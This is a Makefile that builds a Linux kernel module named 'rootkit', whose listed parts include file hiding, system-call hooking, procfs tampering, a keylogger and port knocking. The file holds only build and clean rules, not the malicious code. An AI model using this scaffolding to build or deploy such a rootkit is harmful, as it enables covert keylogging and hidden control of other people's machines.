PWD := $(shell pwd)
BUILD_DIR ?= $(PWD)/build
BUILD_DIR_MAKEFILE ?= $(BUILD_DIR)/Makefile
MODULE_DIR ?= $(PWD)/src
obj-m += rootkit.o
rootkit-objs := main.o misc.o hidefs.o syscalls.o procfs.o hide.o keylogger.o port_knocking.o

all: $(BUILD_DIR_MAKEFILE) module

module: $(BUILD_DIR_MAKEFILE)
	make -C /lib/modules/$(shell uname -r)/build M=$(BUILD_DIR) src=$(PWD) modules

$(BUILD_DIR):
	mkdir -p "$@"

$(BUILD_DIR_MAKEFILE): $(BUILD_DIR)
	touch "$@"

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(BUILD_DIR) src=$(PWD) clean
